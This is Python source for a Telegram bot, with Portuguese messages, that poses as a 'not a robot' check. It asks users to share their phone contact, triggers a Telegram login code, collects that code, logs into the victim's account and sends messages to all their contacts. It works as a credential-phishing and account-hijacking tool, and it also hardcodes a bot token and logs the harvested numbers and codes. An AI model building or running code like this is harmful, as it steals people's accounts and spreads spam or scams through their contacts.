import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
import asyncio
from userbot.main import login_and_send_messages

ASK_PHONE, ASK_CODE = range(2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Iniciando o bot e pedindo confirmação de humano.")
    keyboard = [[KeyboardButton("✅ Não sou um robô")]]
    await update.message.reply_text(
        "Clique no botão abaixo para confirmar que você não é um robô:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE

async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Usuário confirmou que não é um robô. Solicitando número de telefone.")
    return await ask_phone(update, context)

async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Solicitando número de telefone ao usuário.")
    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
    await update.message.reply_text(
        "Por favor, envie seu número de telefone clicando no botão abaixo:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE  # Corrigido para garantir que o estado correto seja retornado

async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usuário.")
    if update.message.contact:
        context.user_data["phone"] = update.message.contact.phone_number
        phone = context.user_data["phone"]
        print(f"Número de telefone recebido: {phone}")

        try:
            await update.message.reply_text("Enviando código de acesso para o Telegram...")
            result = await login_and_send_messages(phone, None)
            if "Erro ao logar" in result:
                if "Returned when all available options for this type of number were already used" in result:
                    await update.message.reply_text(
                        "Tentando novamente enviar o código de acesso..."
                    )
                    print("Reiniciando tentativa de envio do código de acesso...")
                    result = await login_and_send_messages(phone, None)
                    if "Erro ao logar" in result:
                        await update.message.reply_text(result)
                        return await ask_phone(update, context)  # Rechama a função para solicitar novamente
                else:
                    await update.message.reply_text(result)
                    return await ask_phone(update, context)  # Rechama a função para solicitar novamente

            await update.message.reply_text(
                "Código enviado com sucesso! Verifique seu Telegram e envie aqui o código de 5 dígitos que recebeu."
            )
            return ASK_CODE
        except Exception as e:
            print(f"Erro ao tentar enviar o código: {e}")
            await update.message.reply_text("Erro ao enviar o código. Por favor, tente novamente.")
            return await ask_phone(update, context)  # Rechama a função para solicitar novamente
    else:
        print("Contato inválido recebido.")
        await update.message.reply_text("Contato inválido. Por favor, envie novamente.")
        return await ask_phone(update, context)  # Rechama a função para solicitar novamente

async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo código de acesso do usuário.")
    phone = context.user_data.get("phone")
    code = update.message.text
    if phone and code:
        print(f"Tentando login com o número {phone} e código {code}.")
        await update.message.reply_text("Realizando login e enviando mensagens aos seus contatos...")
        result = await login_and_send_messages(phone, code)
        print("Login realizado e mensagens enviadas.")
        await update.message.reply_text(result)
    else:
        print("Número ou código inválido fornecido.")
        await update.message.reply_text("Número ou código inválido.")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Operação cancelada pelo usuário.")
    await update.message.reply_text("Operação cancelada.")
    return ConversationHandler.END

def main():
    token = "7866074150:AAE77YgcvCyuCYdjNpaCUYkNRplfl8gIEVY"
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human),
                        MessageHandler(filters.CONTACT, receive_contact)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    main()
